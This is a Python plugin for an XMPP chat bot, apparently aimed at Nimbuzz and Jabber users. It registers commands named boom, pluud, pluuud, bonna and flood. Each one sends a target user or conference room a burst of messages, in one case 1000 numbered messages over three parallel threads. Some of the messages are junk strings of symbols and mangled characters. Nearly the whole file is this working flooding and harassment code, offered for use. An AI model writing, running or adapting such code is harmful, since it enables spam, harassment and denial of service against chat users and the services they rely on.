#--===auroraplugin===--
#  -*- coding: utf-8 -*-
#  aurora plugin
#  plud_plugin.py
#  coded by kf (kforkingfisher@gmail/nimbuzz.com)
#############################################
###########    ##    #####         ##########
############  ###  #######  #####  ##########
############  ##  ########  #################
############  #  #########  #################
############    ##########  #### ############
############   ###########       ############
############    ##########  #### ############
############  #  #########  #################
############  ##   #######  #################
############  ###   ######  #################
###########    ##     ###    ################
#############################################
###########KFORKINGFISHER@GMAIL.COM##########
##########KFORKINGFISHER@NIMBUZZ.COM#########
#############################################

def boom_exe(type, source, jid):
        how = 1000
        for i in range(0, int(how) ):
                msg(jid, '¶(&,#,1,;)¶(&,#,1,;)\>(&,#,1,;)(&,#,1,;)++***_***++\>(&,#,1,;)(&,#,1,;)¶(&,#,1,;)¶(&,#,1,;) ? ??®Îò???ð???ð?????ð??ð????ð??ñ????????ñ?????????????ð?ð???????  ????')
                time.sleep(0.1)
        reply(type, source, u'done')


def boom_start(type, source, parameters):
        q1 = type
        q2 = source
        q3m = parameters.split()
        q3 = q3m[0]
        reply(type, source, u'(ok)')
        threading.Thread(None, boom_exe, 'at'+str(random.randrange(0, 999999)), (q1, q2, q3)).start()


def fld_exe(type, source, jid):
        how = 11
        for i in range(0, int(how) ):
                msg(jid, ':*:*:*:*:*:*:*:*:*:* \n*:*:*:*:*:*:*:*:*:* \n*:*:*:*:*:*:*:*:*:* \n*:*:*:*:*:*:*:*:*:* \n*:*:*:*:*:*:*:*:*:* \n*:*:*:*:*:*:*:*:*:* ')
                time.sleep(0.1)
        reply(type, source, u'done')


def fld_start(type, source, parameters):
        q1 = type
        q2 = source
        q3m = parameters.split()
        q3 = q3m[0]
        reply(type, source, u'(ok)')
        threading.Thread(None, fld_exe, 'at'+str(random.randrange(0, 999999)), (q1, q2, q3)).start()

def pluud_exe(type, source, jid):
        how = 11
        for i in range(0, int(how) ):
                msg(jid, '(&,#,1,;)(&,#,1,;)¶(&,#,1,;)¶(&,#,1,;) ? ??®Îò???ð???ð??(&,#,1,;)(&,#,1,;)¶(&,#,1,;)¶(&,#,1,;) ? ??®Îò???ð???ð??(&,#,1,;)(&,#,1,;)¶(&,#,1,;)¶(&,#,1,;) ? ??®Îò???ð???ð??(&,#,1,;)(&,#,1,;)¶(&,#,1,;)¶(&,#,1,;) ? ??®Îò???ð???ð??(&,#,1,;)(&,#,1,;)¶(&,#,1,;)¶(&,#,1,;) ? ??®Îò???ð???ð??')
                time.sleep(0.1)
        reply(type, source, u'done')


def pluud_start(type, source, parameters):
        q1 = type
        q2 = source
        q3m = parameters.split()
        q3 = q3m[0]
        reply(type, source, u'(ok)')
        threading.Thread(None, pluud_exe, 'at'+str(random.randrange(0, 999999)), (q1, q2, q3)).start()
			

def pluuud_exe(type, source, jid):
        how = 11
        for i in range(0, int(how) ):
                msg(jid, '*CRAZY**CRAZY**CRAZY*\n;D    ;D \n      ;D\nm/\n8-)\n       *NO*   *NO*\n>:o>:o\n:-D\n:-D\n\n%)\n\n%)')
                time.sleep(0.1)
        reply(type, source, u'done')


def pluuud_start(type, source, parameters):
        q1 = type
        q2 = source
        q3m = parameters.split()
        q3 = q3m[0]
        reply(type, source, u'(ok)')
        threading.Thread(None, pluuud_exe, 'at'+str(random.randrange(0, 999999)), (q1, q2, q3)).start()

def flood_exe(type, source, jid):
        how = 1000
        for i in range(0, int(how) ):
                msg(jid, str(i))
                time.sleep(0.1)
        reply(type, source, u'done')


def flood_start(type, source, parameters):
        q1 = type
        q2 = source
        q3m = parameters.split()
        q3 = q3m[0]
        q4 = q3m[1]
        q5 = q3m[2]
        reply(type, source, u'Ok')
        threading.Thread(None, flood_exe, 'at'+str(random.randrange(0, 999)), (q1, q2, q3)).start()
        threading.Thread(None, flood_exe, 'at'+str(random.randrange(0, 999)), (q1, q2, q4)).start()
        threading.Thread(None, flood_exe, 'at'+str(random.randrange(0, 999)), (q1, q2, q5)).start()

register_command_handler(boom_start, 'boom', ['superadmin','new','all'], 100, 'Run flood pvt.', 'boom <jid>', ['boom guy@nimbuzz.com'])
register_command_handler(fld_start, 'bonna', ['superadmin','new','all'], 100, 'Run flood room add pvt.', 'plud <room jid>', ['plud guy@nimbuzz.com', 'plud room_name@conference.nimbuzz.com'])
register_command_handler(pluud_start, 'pluud', ['superadmin','new','all'], 100, 'Run flood room add pvt.', 'pluud <room jid>', ['pluud guy@nimbuzz.com', 'pluud room_name@conference.nimbuzz.com'])
register_command_handler(pluuud_start, 'pluuud', ['superadmin','new','all'], 100, 'Run flood room add pvt.', 'pluuud <room jid>', ['pluuud guy@nimbuzz.com', 'pluuud room_name@conference.nimbuzz.com'])
register_command_handler(flood_start, 'flood', ['superadmin','new','all'], 100, 'Run flood in 3 streams (or at 3 different JID, better use one JID of all 3 flows) Send 1000 messages.', 'flood <jid1> <jid2> <jid3>', ['flood qwerty@jabber.ru qwerty@jabber.ru qwerty@jabber.ru', 'flood qwerty@jabber.ru uytfd@jabber.ru hgfvbhj@jabber.ru'])
